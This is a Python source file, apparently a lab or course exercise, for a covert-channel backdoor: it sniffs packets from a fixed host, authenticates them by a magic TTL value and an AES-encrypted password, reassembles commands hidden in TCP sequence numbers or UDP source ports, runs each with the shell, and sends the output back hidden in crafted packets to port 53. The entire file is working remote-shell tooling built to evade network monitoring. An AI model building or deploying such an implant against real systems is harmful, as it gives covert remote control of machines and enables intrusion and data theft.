from scapy.all import *
from Crypto.Cipher import AES
import uuid
import time
import subprocess

# Inputs
localIP = "192.168.0.23"
ttlKey = 164
srcPort = 80
dstPort = 53
key = "0123456789abcdef"
IV = "abcdefghijklmnop"
messages = []
authentication = "TEST!"
# clientIP = "192.168.0.22"


def decrypt(command):
    global key
    global IV
    decryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = decryptor.decrypt(command)
    return plain


def encrypt(command):
    global key
    global IV
    encryptor = AES.new(key, AES.MODE_CFB, IV=IV)
    plain = encryptor.encrypt(command)
    return plain


def addToMessages(messages, UID, total, covertContent):
    # Edge case if command array is empty
    if(len(messages) == 0):
        #print 'Commands is empty, creating a new element'
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)
    # If the messages array is NOT empty, search by UID
    else:
        #PsuedoCode
        #Check the current list of messages
        # if there is already some messages witht he same UID
        # then append it to that.
        for x in range(len(messages)):
            if(messages[x][0] == UID):
                #print "There is an existing element with same UID"
                messages[x][2].append(covertContent)
                return;
                # print messages
            pass
        # If NONE of the elements have the same UID, create a
        # new entry
        #print "There are no elements with the same UID"
        element = [UID, [int(total)], [covertContent]]
        messages.append(element)


def checkCommands(UID):
    #print "--Checking Commands--"
    #print(messages)
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            #print "ELEMENT = UID"
            total = element[1][0]
            #print "The total amount of messages is " + str(total)
            numMessages = len(element[2])
            #print "The number of messages is " + str(numMessages)
            if(numMessages == total):
                return True
    pass
    return False

def deleteCommand(UID):
    #print "Deleting command with UID " + str(UID)
    #print "Num of elements is " + str(len(messages));
    for x in range(len(messages)):
        element = messages[x]
        #print element[0]
        if(element[0] == UID):
            del messages[x]
    pass
    #print "After delete, the lenght is " + str(len(messages))

def reconstructCommand(UID):
    #print "Reconstructing command"
    for element in messages:
        # print element
        text = ""
        if(element[0] == UID):
            data = element[2]
            #print data
            for value in data:
                text = text + str(value)
                pass
            # print text
            #Split into chunks of 8
            line = text
            n = 8
            chunks = [line[i:i+n] for i in range(0, len(line), n)]
            #Convert each element in array to integer
            # print "chunks is " + str(chunks)
            for x in range(0, len(chunks)):
                 chunks[x] = int(chunks[x], 2)
                 chunks[x] = chr(chunks[x])
            # print chunks
            return ''.join(chunks)
        pass


def authenticate(packet):
    global command
    global authentication
    # Check TTL first
    ttl = packet[IP].ttl
    # Checks if the ttl matches with ours
    if ttl == ttlKey:
        # Check the password in the payload
        payload = packet["Raw"].load
        # Decrypt payload, sequence number
        decryptedData = decrypt(payload)
        # print "Packet payload " + decryptedData
        # Check if password in payload is correct
        password = decryptedData.split("\n")[0]
        #password = payload[0]
        # print "Password: " + password
        if(password == authentication):
            return True
        else:
            return False
    return False


def handle(packet):
    #TODO: FIX THIS
    if(packet[IP].src != localIP):
        if authenticate(packet):
            global clientIP
            clientIP = packet[IP].src
            payload = decrypt(packet["Raw"].load).split("\n")
            # print "Payload"
            # print payload
            UID = payload[1]
            # print "UID is " + UID
            position = payload[2].split(":")[0]
            # print "Position is " + position
            total = payload[2].split(":")[1]
            # print "Total is " + total

            if(packet.haslayer(TCP)):
                #Define the length
                length = 32
                # decrypt the covert contents
                # print "Covert content = " + str(packet[TCP].seq)
                # convert to binary
                covertContent = bin(packet[TCP].seq)[2:].zfill(length)
                # print "binary is " + covertContent
            elif(packet.haslayer(UDP)):
                length = 16
                # decrypt the covert contents
                # print "Covert content = " + str(packet[UDP].sport)
                # convert to binary
                covertContent = bin(packet[UDP].sport)[2:].zfill(length)
                # print "binary is " + covertContent
            # If there is only 1 message for this command, reconstruct it
            #if(total == 1):
                #DEBUG: print "Only one message, just reconstruct it"
            # Else, add to an array
            if(total != 1):
                #DEBUG: print "Multipart command, add to messages"
                addToMessages(messages, UID, total, covertContent)
                # After every add, check if the max has been reached
                if(checkCommands(UID)):
                    #DEBUG: print "Max reached, reconstruct command"
                    command = reconstructCommand(UID)
                    print "COMMAND: " + command
                    #Delete that command from the list
                    deleteCommand(UID)
                    result = runCommand(command)
                    #print "Result is " + result
                    #threaad.sleep(5)
                    sendmessage("TCP",result)
                    #Run the command
                # else:
                    #DEBUG: print "Max not reached, don't reconstruct command yet"

############################################SENDING BACK###################
#Conver the message to ascii to bits
def messageToBits(message):
    # print "The message is " + message
    messageData =""
    for c in message:
        #bin(int(messageData))[2:]
        # print "Char code is " + str(ord(c))
        var = bin(ord(c))[2:].zfill(8)
        # print var
        messageData += str(var)
    # print "Message data is " + messageData
    return messageData

def chunkMessage(message,protocol):
    # print "Message is "  + message
    if(protocol == "TCP"):
		length = 32
    elif(protocol == "UDP"):
		length = 16
    # print str(len(message))

    if(len(message) == length ):
        # print "chunkMessage:The length of the message is the same as the max"
        output = []
        output.append(message)
        return message
    elif(len(message) <= length):
        # print "chunkMessage:The length of the message is less than the max so "\
        # "prepend"
        return message.zfill(length)
    elif(len(message) > length):
        # print "chunkMessage: The length is greater than the max, so will be "\
        # "excess"
        #What will be left over after we chunk the length bit chunks
        rounds = len(message) / length
        excess = len(message) % length
        # print "Rounds is " + str(rounds)
        output = []
        i = 0
        start = 0
        end = 0
        while(i < rounds):
            #print "ROUND:  #" + str(i)
            # print "This is round" + str(i)
            start = i*length #0
            # print "START: " + str(start)
            end = (i*length)+(length - 1) #31
            # print "END: " + str(end)
            output.append(message[start:end+1])
            #print "Appending " + str(message[start:end+1])
            i = i + 1
            # print "END OF ROUND " + str(output)
            # print "LENGTH OF ROUND IS " + str(len(message[start:end+1]))
        #Get the remainder
        if(excess > 0):
            output.append(message[(end+1):(end+1+excess)])
        # print output
        return output

def generateUID():
    uid = uuid.uuid1()
    #print 'Made a UID ' + str(uid)
    return str(uid)


def craftPackets(data,protocol):
    packets = []
    #If the length of the number is larger than what is allowed in one packet, split it
    counter = 0
    #Create a UID to put in every packet, so that we know what session the
    #Packets are part of
    UID = generateUID()
    #print "The number of messages to send is " + str(len(data))
    while (counter < len(data)):
        #print str(data[counter])
        packets.append(craftPacket(data[counter],protocol,counter+1,len(data),UID))
        counter = counter + 1

    return packets

def craftPacket(data,protocol,position,total,UID):
    global clientIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
    global password
    global authentication

    #print "Data is " + str(data)

    #print "Crafting packet for # " + str(position) + " / " + str(total)
    if(protocol == "TCP"):
        #print "Put Data " + str(int(data,2)) + "into Seq Number"
        packet = IP(dst=clientIP, ttl=ttlKey)/TCP(sport=srcPort,dport=dstPort, \
        seq=int(str(data),2))/Raw(load=encrypt(authentication+"\n"+UID+"\n"+str(position)+":" \
        + str(total)))
    elif(protocol == "UDP"):
        packet = IP(dst=clientIP, ttl=ttlKey)/UDP(sport=int(str(data),2),\
        dport=dstPort)/Raw(load=encrypt(authentication+"\n"+UID+"\n"+ str(position) + \
         ":"+str(total)))
    return packet

def sendmessage(protocol,message):
    global clientIP
    global ttlKey
    global srcPort
    global dstPort
    global encryptionKey
    global IV
	#1. Encrypt the message
	#2. Convert message to ASCII to Bits
    message = messageToBits(message)
    #print "Message is " + message
    #3. Chunk message into the size appropriate for the protocol
    chunks = chunkMessage(message,protocol)
    #print "Chunks are " + str(chunks)
	#4. Craft packets
    packets = craftPackets(chunks,protocol)

	#5. Send the packets
    for packet in packets:
        send((packet),verbose=0)
        pass

def runCommand(command):
    command = command.replace("\0", '')
    f = subprocess.Popen(str(command), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = f.stdout.read() + f.stderr.read()
    if result == "":
        result = "ERROR or No Output Produced"
    #print "Output is " + result
    return result

sniff(filter="ip and host 192.168.0.22", prn=handle)
